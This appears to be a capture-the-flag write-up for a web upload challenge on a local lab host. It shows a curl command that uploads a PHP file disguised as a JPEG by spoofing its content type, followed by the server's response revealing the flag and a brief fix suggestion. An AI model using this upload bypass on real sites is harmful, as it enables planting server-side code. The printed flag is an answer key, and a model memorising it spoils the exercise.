# Upload

## Link: http://192.168.64.3/?page=upload

- cd /tmp
- touch hack.php
- curl -F "Upload=Upload" -F "uploaded=@hack.php;type=image/jpeg" http://192.168.64.3/\?page\=upload
- Result:

```html
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/hack.php succesfully uploaded.</pre>
```

flag: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

## How to fix

- Add more filter than just file extention
